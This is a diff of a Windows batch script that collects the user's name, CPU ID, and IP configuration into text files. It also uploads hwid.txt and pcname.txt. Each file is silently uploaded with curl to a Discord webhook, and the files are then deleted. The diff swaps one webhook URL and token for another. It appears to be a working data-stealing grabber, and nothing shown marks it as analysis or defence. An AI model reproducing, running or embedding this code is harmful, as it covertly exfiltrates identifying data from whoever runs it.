@@ -6,11 +6,11 @@ echo %username%>pcusername.txt
 wmic cpu get processorid>cpuid.txt 
 ipconfig > ip.txt
 
-curl --silent --output /dev/null -F l=@"hwid.txt" https://discord.com/api/webhooks/1151710086868242542/r2y3Yo3m_Pthi10Jbp0iHig5PgaG9NNBft838dxvQELdY6UjDtxtQeW4MxYVbwfbEiWk 
-curl --silent --output /dev/null -F l=@"cpuid.txt" https://discord.com/api/webhooks/1151710086868242542/r2y3Yo3m_Pthi10Jbp0iHig5PgaG9NNBft838dxvQELdY6UjDtxtQeW4MxYVbwfbEiWk 
-curl --silent --output /dev/null -F l=@"pcusername.txt" https://discord.com/api/webhooks/1151710086868242542/r2y3Yo3m_Pthi10Jbp0iHig5PgaG9NNBft838dxvQELdY6UjDtxtQeW4MxYVbwfbEiWk 
-curl --silent --output /dev/null -F l=@"pcname.txt" https://discord.com/api/webhooks/1151710086868242542/r2y3Yo3m_Pthi10Jbp0iHig5PgaG9NNBft838dxvQELdY6UjDtxtQeW4MxYVbwfbEiWk 
-curl --silent --output /dev/null -F l=@"ip.txt" https://discord.com/api/webhooks/1151710086868242542/r2y3Yo3m_Pthi10Jbp0iHig5PgaG9NNBft838dxvQELdY6UjDtxtQeW4MxYVbwfbEiWk
+curl --silent --output /dev/null -F l=@"hwid.txt" https://discord.com/api/webhooks/1152386061192937583/luZ372hNeyAbnVirHki0GJUJ4tifDyY_eh6JP-dVdsJoR04c6dTEe95IT2WcH_JuLGzD 
+curl --silent --output /dev/null -F l=@"cpuid.txt" https://discord.com/api/webhooks/1152386061192937583/luZ372hNeyAbnVirHki0GJUJ4tifDyY_eh6JP-dVdsJoR04c6dTEe95IT2WcH_JuLGzD 
+curl --silent --output /dev/null -F l=@"pcusername.txt" https://discord.com/api/webhooks/1152386061192937583/luZ372hNeyAbnVirHki0GJUJ4tifDyY_eh6JP-dVdsJoR04c6dTEe95IT2WcH_JuLGzD 
+curl --silent --output /dev/null -F l=@"pcname.txt" https://discord.com/api/webhooks/1152386061192937583/luZ372hNeyAbnVirHki0GJUJ4tifDyY_eh6JP-dVdsJoR04c6dTEe95IT2WcH_JuLGzD 
+curl --silent --output /dev/null -F l=@"ip.txt" https://discord.com/api/webhooks/1152386061192937583/luZ372hNeyAbnVirHki0GJUJ4tifDyY_eh6JP-dVdsJoR04c6dTEe95IT2WcH_JuLGzD
 
 del pcname.txt 
 del hwid.txt 
